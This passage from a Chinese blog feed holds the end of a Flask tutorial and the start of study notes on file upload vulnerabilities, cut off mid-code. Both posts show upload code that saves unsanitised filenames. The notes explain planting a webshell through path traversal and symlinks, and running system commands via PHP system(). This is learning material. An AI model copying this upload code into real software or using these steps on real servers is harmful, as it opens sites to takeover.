cannot be zero.'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>结构化响应：</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> status_code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token string\">'error'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">'message'</span><span class=\"token punctuation\">:</span> message<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token string\">'status_code'</span><span class=\"token punctuation\">:</span> status_code</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> status_code</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>使用时：</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">return</span> error_response<span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid email format'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'INVALID_EMAIL'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>全局错误处理：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>errorhandler</span><span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>定义处理<span class=\"token number\">404</span>的函数</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">not_found</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Page not found'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">404</span></pre></td></tr></table></figure><h3 id=\"视图函数的装饰器\"><a class=\"anchor\" href=\"#视图函数的装饰器\">#</a> 视图函数的装饰器</h3>\n<ul>\n<li><strong> <code>@app.before_request</code> </strong>：在每个请求处理之前运行的函数。</li>\n<li><strong> <code>@app.after_request</code> </strong>：在每个请求处理之后运行的函数。</li>\n<li><strong> <code>@app.teardown_request</code> </strong>：在请求结束后运行的函数，用于清理工作。</li>\n</ul>\n<h3 id=\"视图函数返回的状态码\"><a class=\"anchor\" href=\"#视图函数返回的状态码\">#</a> 视图函数返回的状态码</h3>\n<p>指定状态码（就上面那个）:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token string\">'Everything is OK'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span></pre></td></tr></table></figure><p>返回带状态码的对象：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> Response<span class=\"token punctuation\">(</span><span class=\"token string\">'An error occurred'</span><span class=\"token punctuation\">,</span> status<span class=\"token operator\">=</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"模板渲染\"><a class=\"anchor\" href=\"#模板渲染\">#</a> 模板渲染</h2>\n<h3 id=\"创建\"><a class=\"anchor\" href=\"#创建\">#</a> 创建</h3>\n<p><strong>{{ title }}</strong> 和 <strong>{{ name }}</strong> 是模板占位符，将在渲染时被替换成实际的值</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">'Welcome Page'</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'John Doe'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>可以传入对象</pre></td></tr></table></figure><h3 id=\"继承\"><a class=\"anchor\" href=\"#继承\">#</a> 继承</h3>\n<p>基础模板：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">{% block title %}My Website{% endblock %}</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>main</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">{% block content %}{% endblock %}</span>   可替换区域</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>main</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>子模板：</p>\n<pre><code>{% raw %}\n{% extends \"base.html\" %}  //继承基础模板\n{% block title %}Home Page{% endblock %}  //重写替换区域的内容\n{% block content %}\n<pre>\n<h2>Welcome to the Home Page!</h2>\n<p>Content goes here.</p>\n</pre>\n{% endblock %}\n{% raw %}\n</code></pre>\n<h3 id=\"控制结构\"><a class=\"anchor\" href=\"#控制结构\">#</a> 控制结构</h3>\n<pre><code>&#123;% if user %&#125;\n&#123;% else %&#125;\n&#123;% endif %&#125;\n</code></pre>\n<pre><code>&#123;% for item in items %&#125;\n&#123;% endfor %&#125;\n</code></pre>\n<h3 id=\"过滤器\"><a class=\"anchor\" href=\"#过滤器\">#</a> 过滤器</h3>\n<p>处理变量用</p>\n<p><strong>{{ name|capitalize }}</strong>：将 name 变量的值首字母大写。</p>\n<p><strong>{{ price|round(2) }}</strong>：将 price 变量的值四舍五入到小数点后两位。</p>\n<h4 id=\"可能有用的\"><a class=\"anchor\" href=\"#可能有用的\">#</a> 可能有用的</h4>\n<p><strong>字符串处理</strong></p>\n<table>\n<thead>\n<tr>\n<th>过滤器</th>\n<th>功能描述</th>\n<th>示例输入</th>\n<th>输出结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>lower</code></td>\n<td>转换为小写</td>\n<td><code>&quot;Hello&quot;</code></td>\n<td><code>&quot;hello&quot;</code></td>\n</tr>\n<tr>\n<td><code>upper</code></td>\n<td>转换为大写</td>\n<td><code>&quot;world&quot;</code></td>\n<td><code>&quot;WORLD&quot;</code></td>\n</tr>\n<tr>\n<td><code>title</code></td>\n<td>每个单词首字母大写</td>\n<td><code>&quot;hello world&quot;</code></td>\n<td><code>&quot;Hello World&quot;</code></td>\n</tr>\n<tr>\n<td><code>trim</code></td>\n<td>去除前后空格</td>\n<td><code>&quot; flask &quot;</code></td>\n<td><code>&quot;flask&quot;</code></td>\n</tr>\n<tr>\n<td><code>striptags</code></td>\n<td>去除 HTML/XML 标签</td>\n<td><code>&quot;Hello Flask&quot;</code></td>\n<td><code>&quot;Hello Flask&quot;</code></td>\n</tr>\n<tr>\n<td><code>truncate</code></td>\n<td>截断字符串（超出长度后追加省略号）</td>\n<td><code>&quot;long text here&quot; (length=5)</code></td>\n<td><code>&quot;long...&quot;</code></td>\n</tr>\n<tr>\n<td><code>replace(a, b)</code></td>\n<td>替换字符串中的子串</td>\n<td><code>&quot;hello&quot;, &quot;h&quot;, &quot;j&quot;</code></td>\n<td><code>&quot;jello&quot;</code></td>\n</tr>\n<tr>\n<td><code>safe</code></td>\n<td>标记为安全内容（不转义 HTML）</td>\n<td><code>&quot;Hello Flask&quot;</code></td>\n<td>渲染为  <code>Flask</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"数值操作\"><a class=\"anchor\" href=\"#数值操作\">#</a> <strong>数值操作</strong></h5>\n<table>\n<thead>\n<tr>\n<th>过滤器</th>\n<th>功能描述</th>\n<th>示例输入</th>\n<th>输出结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>round</code></td>\n<td>四舍五入</td>\n<td><code>3.14159</code></td>\n<td><code>3</code></td>\n</tr>\n<tr>\n<td><code>int</code></td>\n<td>转换为整数</td>\n<td><code>&quot;42&quot;</code></td>\n<td><code>42</code></td>\n</tr>\n<tr>\n<td><code>float</code></td>\n<td>转换为浮点数</td>\n<td><code>&quot;3.14&quot;</code></td>\n<td><code>3.14</code></td>\n</tr>\n<tr>\n<td><code>format</code></td>\n<td>格式化数值</td>\n<td><code>1000, &quot;0,.2f&quot;</code></td>\n<td><code>&quot;1,000.00&quot;</code></td>\n</tr>\n<tr>\n<td><code>default</code></td>\n<td>设置默认值（变量不存在时使用）</td>\n<td><code>undefined_var, &quot;N/A&quot;</code></td>\n<td><code>&quot;N/A&quot;</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"日期时间\"><a class=\"anchor\" href=\"#日期时间\">#</a> <strong>日期时间</strong></h5>\n<table>\n<thead>\n<tr>\n<th>过滤器</th>\n<th>功能描述</th>\n<th>示例输入（Python datetime 对象）</th>\n<th>输出结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>datetimeformat</code></td>\n<td>格式化日期时间</td>\n<td><code>now(), &quot;%Y-%m-%d %H:%M&quot;</code></td>\n<td><code>&quot;2023-10-01 14:30&quot;</code></td>\n</tr>\n<tr>\n<td><code>date</code></td>\n<td>提取日期部分</td>\n<td><code>now()</code></td>\n<td><code>&quot;2023-10-01&quot;</code></td>\n</tr>\n<tr>\n<td><code>time</code></td>\n<td>提取时间部分</td>\n<td><code>now()</code></td>\n<td><code>&quot;14:30:45&quot;</code></td>\n</tr>\n<tr>\n<td><code>timedelta</code></td>\n<td>计算时间差</td>\n<td><code>start_date, end_date</code></td>\n<td><code>&quot;3 days, 2 hours&quot;</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"列表-字典操作\"><a class=\"anchor\" href=\"#列表-字典操作\">#</a> <strong>列表 / 字典操作</strong></h5>\n<table>\n<thead>\n<tr>\n<th>过滤器</th>\n<th>功能描述</th>\n<th>示例输入</th>\n<th>输出结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>length</code></td>\n<td>获取列表 / 字符串长度</td>\n<td><code>[1, 2, 3]</code></td>\n<td><code>3</code></td>\n</tr>\n<tr>\n<td><code>sort</code></td>\n<td>对列表排序</td>\n<td><code>[3, 1, 2]</code></td>\n<td><code>[1, 2, 3]</code></td>\n</tr>\n<tr>\n<td><code>reverse</code></td>\n<td>反转列表</td>\n<td><code>[1, 2, 3]</code></td>\n<td><code>[3, 2, 1]</code></td>\n</tr>\n<tr>\n<td><code>join</code></td>\n<td>连接列表元素</td>\n<td><code>[&quot;a&quot;, &quot;b&quot;], &quot;-&quot;</code></td>\n<td><code>&quot;a-b&quot;</code></td>\n</tr>\n<tr>\n<td><code>keys</code></td>\n<td>获取字典的键列表</td>\n<td><code>&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125;</code></td>\n<td><code>[&quot;a&quot;, &quot;b&quot;]</code></td>\n</tr>\n<tr>\n<td><code>values</code></td>\n<td>获取字典的值列表</td>\n<td><code>&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125;</code></td>\n<td><code>[1, 2]</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"逻辑判断\"><a class=\"anchor\" href=\"#逻辑判断\">#</a> <strong>逻辑判断</strong></h5>\n<table>\n<thead>\n<tr>\n<th>过滤器</th>\n<th>功能描述</th>\n<th>示例输入</th>\n<th>输出结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>if</code></td>\n<td>条件判断</td>\n<td><code>user.is_authenticated</code></td>\n<td>根据条件渲染内容</td>\n</tr>\n<tr>\n<td><code>default</code></td>\n<td>变量不存在时使用默认值</td>\n<td><code>username, &quot;Guest&quot;</code></td>\n<td><code>&quot;Guest&quot;</code> （若 username 未定义）</td>\n</tr>\n<tr>\n<td><code>none</code></td>\n<td>判断是否为  <code>None</code></td>\n<td><code>value</code></td>\n<td><code>true</code>  或  <code>false</code></td>\n</tr>\n<tr>\n<td><code>defined</code></td>\n<td>判断变量是否存在</td>\n<td><code>undefined_var</code></td>\n<td><code>false</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"其他实用过滤器\"><a class=\"anchor\" href=\"#其他实用过滤器\">#</a> <strong>其他实用过滤器</strong></h5>\n<table>\n<thead>\n<tr>\n<th>过滤器</th>\n<th>功能描述</th>\n<th>示例输入</th>\n<th>输出结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>pprint</code></td>\n<td>格式化输出（用于调试）</td>\n<td><code>&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125;</code></td>\n<td>美观缩进的 JSON 格式</td>\n</tr>\n<tr>\n<td><code>markdown</code></td>\n<td>将 Markdown 转换为 HTML</td>\n<td><code>&quot;# Hello\\n**Flask**&quot;</code></td>\n<td>渲染后的 HTML 内容</td>\n</tr>\n<tr>\n<td><code>urlencode</code></td>\n<td>对 URL 进行编码</td>\n<td><code>&quot;https://example.com?q=test&quot;</code></td>\n<td>编码后的字符串</td>\n</tr>\n<tr>\n<td><code>regex_replace</code></td>\n<td>使用正则表达式替换</td>\n<td><code>&quot;a1b2c3&quot;, &quot;[0-9]&quot;, &quot;&quot;</code></td>\n<td><code>&quot;abc&quot;</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"链式调用示例\"><a class=\"anchor\" href=\"#链式调用示例\">#</a> <strong>链式调用示例</strong></h5>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">{{ \"  hello world  \"|trim|title|replace(\" \", \"-\") }}</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">&lt;!-- 输出：\"Hello-World\" --></span></pre></td></tr></table></figure><h5 id=\"八自定义过滤器\"><a class=\"anchor\" href=\"#八自定义过滤器\">#</a> 八。自定义过滤器</h5>\n<p>在 Flask 中可以注册自定义过滤器：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>template_filter</span><span class=\"token punctuation\">(</span><span class=\"token string\">'reverse'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_filter</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span> 模板中使用 <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">18</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> → <span class=\"token string\">\"olleh\"</span></pre></td></tr></table></figure><h3 id=\"宏和模板包含\"><a class=\"anchor\" href=\"#宏和模板包含\">#</a> 宏和模板包含</h3>\n<p>将在一个 html 文件中插入另一个的内容</p>\n<h4 id=\"创建宏\"><a class=\"anchor\" href=\"#创建宏\">#</a> 创建宏</h4>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">{% raw %}</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">{% macro render_item(item) %}\n<pre>\n<div>\n    <h3>{{ item.title }}</h3>\n    <p>{{ item.description }}</p>\n</div>\n</pre>\n{% endmacro %}</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">{% raw %}</span></pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">{% raw %}</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">{% from \"macros.html\" import render_item %}</span>  //导入宏</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">{% for item in items %}\n{{ render_item(item) }}   //用宏渲染每个item\n{% endfor %}</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">{% raw %}</span></pre></td></tr></table></figure><h3 id=\"模板上下文\"><a class=\"anchor\" href=\"#模板上下文\">#</a> 模板上下文</h3>\n<p>传递的参数可以直接用</p>\n<h2 id=\"表单处理\"><a class=\"anchor\" href=\"#表单处理\">#</a> 表单处理</h2>\n<blockquote>\n<p>获取就是上面的 <strong>request.form.get('name')</strong></p>\n</blockquote>\n<p>[Flask-WTF 表单]( <a href=\"https://www.runoob.com/flask/flask-form.html\">Flask 表单处理 | 菜鸟教程</a> )，用于防 CSRF, 可以进行表单验证。PS: 懒得看了～(这就是不学的理由？)</p>\n<h3 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h3>\n<p>通过 <strong>request.files</strong> 访问 。改一下编码类型（这真的需要自己改么......）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> url_for</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>app<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> <span class=\"token string\">'your_secret_key'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/upload'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        filename <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>filename  <span class=\"token operator\">//</span>获取原始文件名</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'uploads/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filename<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'File uploaded successfully: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>filename<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'No file uploaded'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>通过  <code>request.files.get('file')</code>  尝试从请求中获取名为  <code>file</code>  的文件对象。 <code>request.files</code>  是一个字典，存储了所有上传的文件</p>\n<p>使用  <code>file.save()</code>  方法将文件保存到  <code>uploads</code>  目录下，文件名保持不变</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "url": "https://zhewanyiershinicheng.github.io/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "title": "文件上传漏洞",
            "date_published": "2025-02-15T14:21:23.000Z",
            "content_html": "<h1 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h1>\n<h2 id=\"奇怪的要求~\"><a class=\"anchor\" href=\"#奇怪的要求~\">#</a> 奇怪的要求～</h2>\n<p>1、请大家写一个文件上传的表单，用于向服务端上传文件，并用 php 作为后端，抓包分析这个请求体的结构是什么样的呢？</p>\n<pre><code class=\"language-php+HTML\">&lt;!-- 前端表单 --&gt;\n&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;\n    &lt;input type=&quot;file&quot; name=&quot;myfile&quot;&gt;\n    &lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n\n&lt;!-- PHP后端 upload.php --&gt;\n&lt;?php\nmove_uploaded_file($_FILES['myfile']['tmp_name'], 'uploads/'.$_FILES['myfile']['name']);\n</code></pre>\n<blockquote>\n<p>对于前端的部分:</p>\n<p>action=&quot;upload.php&quot; 是将数据提交到目标 url，由该 php 文件处理（也就是说要注意路径可以绝对可以相对，如在上级，可用../upload.php）</p>\n<p>enctype=&quot;multipart/form-data&quot; 是指定传输过程中的编码类型</p>\n<p>其中包括：</p>\n<p>application/x-www-form-urlencoded</p>\n<p>使用 url 编码，是默认的方式，只能文本数据，存在于 HTTP 请求体</p>\n<p>multipart/form-data</p>\n<p>上传文件必用，会把数据分为多个部分（文本或二进制，所以非文本都是使用二进制文件，不能使用其他编码方式）</p>\n<p>text/plain</p>\n<p>纯文本传输，原始格式不变，键值间等号连接，没有封装或编码</p>\n</blockquote>\n<blockquote>\n<p>对于后端的部分:</p>\n<p>move_uploaded_file()</p>\n<p>是 php 内置函数，移动文件，接受俩参数</p>\n<p><code>$_FILES['myfile']['tmp_name']</code> ：</p>\n<p>$_FILES 是超全局数组，用于处理上传的文件。</p>\n<p><strong>myfile 是 name 属性值</strong>。</p>\n<p><code>['tmp_name']</code>  是<strong>临时存储路径</strong>。</p>\n<p><code>['name']</code>  是<strong>文件名</strong></p>\n<p>(不只这个键，但键是固定的，不是按照实际填，它是返回实际)</p>\n<p>后面一个参数通过拼接字符串构造要移动到的<strong>路径</strong></p>\n</blockquote>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundaryABC123</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>------WebKitFormBoundaryABC123</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"myfile\"; </span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>//头部字段，前一个表示是表单数据</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>filename=\"test.txt\"   //原始文件名</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/plain</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token text-plain\"></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>文件内容在这里...</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>------WebKitFormBoundaryABC123--</span></pre></td></tr></table></figure><blockquote>\n<p><code>boundary</code>  是  <code>multipart/form-data</code>  的参数，定义用于区分请求体各个部分的分隔符。</p>\n</blockquote>\n<p>2、怎样去指定上传目录（如 /tmp）s，在这种情况下你有什么招能让木马文件落地在 web 目录（假设为 /var/www/html）呢？</p>\n<blockquote>\n<p><a href=\"http://xn--onqr6jrws.sh\">可以是.sh</a>,.bin,.php,.asp/aspx (windows 服务器上的同名应用程序可执行),.jsp (基于 java 的 web 程序)</p>\n</blockquote>\n<blockquote>\n<p>路径穿越攻击</p>\n<p>这是因为上面的拼接路径导致的</p>\n<p>由于文件名直接拼接所以如果文件名本身是个路径，也会直接拼接进去</p>\n<p>（所以可以通过构造../../../../../shell.php，不断向上层目录移动）</p>\n</blockquote>\n<blockquote>\n<p>符号链接 (软链接) 攻击</p>\n<p>类似于快捷方式</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> /var/www/html /tmp/link</pre></td></tr></table></figure><p>这样原本写入 /tmp 的会直接到 /var/www/html（要构造成 link/shell.php）</p>\n</blockquote>\n<blockquote>\n<p>PHP 路径处理缺陷攻击</p>\n<p>类似于路径穿越，但是不一定要用../，可以去敏感路径</p>\n<p>包括：</p>\n<ol>\n<li>Web 根目录</li>\n</ol>\n<p>Apache 服务器</p>\n<p><code>/var/www/html</code></p>\n<p><code>C:\\wamp\\www</code> （Windows 系统使用 WampServer 时）</p>\n<p>Nginx 服务器</p>\n<p><code>/usr/share/nginx/html</code></p>\n<ol start=\"2\">\n<li>可执行脚本目录</li>\n</ol>\n<p><code>/usr/local/bin</code>  或 <code>/usr/bin</code></p>\n<p><code>C:\\Windows\\System32</code></p>\n</blockquote>\n<p>3、学一下 php 的 eval () 函数的用法，并写点什么好玩的～，如何在 php 中执行系统命令呢？比如 ls</p>\n<blockquote>\n<p>echo 不只是回显，其中的命令也会执行</p>\n<p>比如 echo system ('ls -l')</p>\n<p>所以......</p>\n<p>system($input); &gt; shell.txt</p>\n</blockquote>\n<p>4、在上传文件又要传递一个 POST 参数，此时请求包的参数是什么样的？</p>\n<blockquote>\n<p>分割符下又多了几个，对于非文本，上面的文件内容都是二进制数据</p>\n</blockquote>\n<p>5、你能在 js 的层面限制只能上传图片吗？</p>\n<p>使用事件侦听器</p>\n<blockquote>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'input[type=\"file\"]'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">const</span> file <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>file<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">.</span><span class=\"token function\">startsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">'image/'</span><span class=\"token 